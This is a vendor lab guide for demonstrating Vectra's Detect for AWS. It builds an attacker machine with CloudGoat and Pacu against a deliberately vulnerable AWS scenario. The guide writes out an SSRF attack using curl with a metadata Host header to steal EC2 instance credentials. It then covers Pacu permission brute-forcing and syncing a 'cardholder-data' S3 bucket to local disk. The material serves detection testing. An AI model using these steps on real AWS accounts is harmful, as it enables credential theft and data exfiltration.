.. toctree::
   :maxdepth: 3
   :hidden:

   index

-----------------
Detect for AWS BP
-----------------
|
|
What is Detect for AWS?
=======================

Detect for AWS offers advanced Threat Detection & Response coverage for the AWS control plane. We leverage advanced AI & ML techniques to monitor all activity in
an organization’s global AWS footprint for malicious behaviors. Detect for AWS leverages CloudTrail log and contextual IAM information to find malicious activity,
and then attribute it to the malicious actor itself using Vectra’s Kingpin technology.  Detect for AWS is delivered as a SaaS (Software as a Service) solution in
Vectra’s cloud.

Lab Objective
=============
The Detect for AWS Detection lab has been created to empower Vectra field staff and customers with the option to show concrete Detect for AWS Detections in live environments when the situation calls for it. To accomplish this objective, this lab contains a number of scripts, supporting resources, and associated attacker narratives that provide context for both the value and means of test execution.

Lab Notes
=========
-  There are other ways to install the tools and will depend on distro.
-  Setting up the AWS profile may very based on an organizations
   requirements. For instance SSO would vary between org.

Requirements
============
-  Linux or MacOS. Windows is not officially supported.

   -  If you are using Windows we recommand install
      `WSL2 <https://docs.microsoft.com/en-us/windows/wsl/install>`__
   -  If you are using a Linux virtual machine AWS EC2 is not supported
   -  In this guide a new Ubuntu VM was created in VM Fusion. This guide
      goes through setting up the Ubuntu VM.

-  Python3.6+ is required.
-  Terraform >= 0.14 installed and in your $PATH.
-  The AWS CLI installed and in your $PATH, and an AWS account with
   sufficient privileges to create and destroy resources.

   -  AWS `Named profile
      configured <https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html>`__


Build attacker machine
======================

Install common packages
+++++++++++++++++++++++

.. code:: console

   sudo apt-get update && sudo apt install -y ssh vim net-tools curl git python3-pip 

Install awscli
++++++++++++++

-  Download the package

.. code:: console

   curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"

-  Unzip the installer

.. code:: console

   unzip awscliv2.zip

-  Run the install program

.. code:: console

   sudo ./aws/install

Install terraform
+++++++++++++++++

-  Terraform Prerequisites

.. code:: console

   sudo apt-get update && sudo apt-get install -y gnupg software-properties-common

-  Add the HashiCorp GPG key

.. code:: console

   curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -

-  Add the official HashiCorp Linux repository

.. code:: console

   sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"

-  Update to add the repository, and install the Terraform CLI
  
.. code:: console

   sudo apt-get update && sudo apt-get install terraform

Install Cloudgoat
+++++++++++++++++
-  Use git to clone the Cloudgoat repo to home directory and change to
   the new directory

.. code:: console     
   
    git clone https://github.com/RhinoSecurityLabs/cloudgoat.git ~/cloudgoat && cd ~/cloudgoat
   
-  Install the Cloudgoat dependencies

.. code:: console

    pip3 install -r ./core/python/requirements.txt && chmod u+x cloudgoat.py

Install Pacu
++++++++++++

-  Use git to clone the Pacu repo to home directory and change to the
   new directory

.. code:: console

    git clone https://github.com/RhinoSecurityLabs/pacu.git ~/pacu && cd ~/pacu

-  Install the Pacu dependencies
 
.. code:: console      
   
    pip3 install -r requirements.txt

Setup AWS Profile
+++++++++++++++++

-  Setup AWS profile for Cloudgoat. This account will need admin access
   in AWS. This will create or add a new profile in ``~/.aws/config``
   and ``~/.aws/credentials``

-  You will be prompted for
   ``Access Key ID, AWS Secret Access Key, Default region name, Default output format``

.. code:: console

    aws configure --profile cloudgoat

-  Make the new aws profile your default

.. code:: console

   export AWS_PROFILE=cloudgoat

-  Verify credentials are working

.. code:: console

    aws sts get-caller-identity

.. figure:: ./images/awsprofile.png
    :alt: awsprofile

Setup Cloudgoat
+++++++++++++++

- Run Cloudgoat config profile from home directory and set default
  profile. You will be prompted to enter an AWS profile from the
  previous step which we called ``cloudgoat``. This is how cloudgoat
  will access AWS. 
      
.. code:: console
      
    ~/cloudgoat/cloudgoat.py config profile

- Run Cloudgoat config whitlelist
   
.. code:: console

    ~/cloudgoat/cloudgoat.py config whitelist --auto

Create vulnerable infrastructure
++++++++++++++++++++++++++++++++

- Now that the tools are seutp we will use Cloudgoat to setup vulnerable
  infrastructure in AWS. This will create a scenario with a misconfigured
  reverse-proxy server in EC2.

-  Run the attack scenario

.. code:: console
   
    ~/cloudgoat/cloudgoat.py create cloud_breach_s3

.. figure:: ./images/cloudgoatout.png
   :alt: cgsetup

.. note::  **Copy the response to a text file**.  You will need the EC2 IP

Start attack
============

At this point we have created vulnerable infrastructure in AWS using
Cloudgoat. Starting as an anonymous outsider with no access or
privileges, exploit a misconfigured reverse-proxy server to query the
EC2 metadata service and acquire instance profile keys. Then, use those
keys to discover, access, and exfiltrate sensitive data from an S3
bucket.

Get Role Name
+++++++++++++

-  Replace ``<ec2-ip-address>`` with the IP address from the previoues
   step to get a role name. 

.. code:: console

   curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'

.. figure:: ./images/role.png
   :alt: role

.. note:: **Copy the response to a text file**.  You will need the role
Get Credentials
+++++++++++++++

-  Replace ``<ec2-ip-address>`` and ``<ec2-role-name>`` from the
   previous steps to get the keys

.. code:: console

   curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'

.. figure:: ./images/ssrf2.png
   :alt: creds

.. note::  **Copy response to text file**.  You will use the stolen credentials
Pacu Discovery 
++++++++++++++

-  Next we will use pacu to do discovery with the stolen crendentials

   -  Start pacu from the shell session by running ``~/pacu/cli.py``
   -  Create new session in pacu named ``cloud_breach_s3``
   -  Set the keys using ``set_keys`` from the pacu session using the
      stolen credentials from the previous step

.. figure:: ./images/pacukeys.png
   :alt: keys

Pacu Results
++++++++++++

-  Use pacu to start disocvery using the following modules

   -  ``run aws__enum_account`` Get account details: permission denied
   -  ``run iam__enum_permissions`` Get permissions for IAM entity:
      permission denied
   -  ``run iam__enum_users_roles_policies_groups`` Get group polices
      for IAM entity: permission denied
   -  ``run iam__bruteforce_permissions`` Brute force for access to
      services: **BINGO!**

.. figure:: ./images/output.png
   :alt: output

-  The stolen credentials have full access to S3
-  Exit pacu by typing ``exit`` and return to attack
   
Data Exfil
++++++++++

-  Create a new aws profile with stolen credentials

.. code:: console

   aws configure --profile cloud_breach_s3

-  Set the ``AWS Access Key ID`` and ``AWS Secret Access Key`` using the
   stolen credentials

-  Set the “Default region” name and the “Default output” format to
   ``json``

-  Manually add the ``aws_session_token`` to the aws credentails file
   (use i for insert mode then esc :wq to save and close)

.. code:: console

   vi  ~/.aws/credentials

.. figure:: ./images/sestoken.png
   :alt: sestoken

-  Use aws cli to list buckets the stolen credentials have access to

.. code:: console
   
    aws s3 ls --profile cloud_breach_s3
   
.. figure:: ./images/list.png
    :alt: list

-  Download data from the ``cardholder-data`` bucket to local system
   home directory. Replace ``<bucket-name>`` with the bucket to download
   data

.. code:: console  
   
   aws s3 sync s3://<bucket-name> ~/cardholder-data --profile cloud_breach_s3

-  Change to home directory and perfom list to verify data was
   downloaded 
   
.. code:: console 
   
    cd && ls
   
.. figure:: ./images/download.png
    :alt: verify

-  Remove vulnerable infrastructure

.. code:: console 

    ~/cloudgoat/cloudgoat.py destroy cloud_breach_s3

-  Attack had been completed. Review the detections in dfaws dashboard

-  Detections visible include: 
   
   - AWS Organization Discovery- A credential was observed enumerating AWS Organization details.
   - AWS User Permissions Enumeration- Control plane APIs associated with the reconnaissance of IAM resources were invoked in a suspicious way that may be associated with a potential privilege escalation attack.
   - AWS Suspicious Credential Usage- A temporary credential generated by an EC2 instance in your environment was observed attempting to access an AWS API from a source that is not EC2.
   - AWS Suspicious EC2 Enumeration- Control plane APIs associated with reconnaissance on EC2 resources were invoked in a suspicious manner. 
   - AWS S3 Enumeration- Control plane APIs associated with the reconnaissance of S3 resources were invoked in a suspicious manner.

.. figure:: ./images/critical.png
   :alt: critical
